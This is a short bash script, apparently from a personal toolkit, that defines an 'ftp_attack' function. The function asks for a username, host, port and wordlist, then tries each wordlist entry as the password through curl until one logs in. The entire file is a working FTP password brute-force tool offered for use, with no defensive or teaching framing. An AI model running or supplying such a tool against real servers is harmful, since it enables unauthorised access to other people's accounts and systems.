#!/bin/bash
####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved
#### Created: 18-01-2019
####

ftp_attack() {
re='^[0-9]+$'


read -p "FTP Username: " username
if [[ -z $username ]]; then
echo "You must enter a username, aborted"
exit 0
fi

read -p "FTP Host: " host
if [[ -z $host ]]; then
echo "You must enter a hostname or ip number, aborted"
exit 0
fi

read -p "FTP Port: " port
if [[ -z $port ]]; then
echo "You must enter a port, aborted."
exit 0
fi

if ! [[ $port =~ $re ]] ; then
   echo "That's not a valid port, aborted" >&2; exit 1
fi

read -p "Wordlist: " wordlist
if [[ -z $wordlist ]]; then
echo "You must enter a a wordlist"
exit 0
fi

if [[ ! -f $wordlist ]]; then
echo "Can't find $wordlist, aborted"
exit 0
fi




printf "\n====================================================="
printf "\nBruteforce attack will be started within 2 seconds..\n"
printf "Please use (CTRL+C) to abort the attack at anytime..\n"
printf "=====================================================\n"
sleep 2
while read line; do
ftpbrute=$(curl -su $username:$line ftp://$host:$port)
if [[ -n "$ftpbrute"  ]]; then
echo -e "====================================================="
echo -e "Password for $username has been found: \e[1;32m$line\e[0m"
echo -e "=====================================================\n"
exit 0
else
echo -e "Wrong password for $user: \e[1;31m$line\e[0m"
fi
done < $wordlist
echo -e "====================================================="
echo -e "No password in $wordlist matched $username password.."
echo -e "=====================================================\n"
}
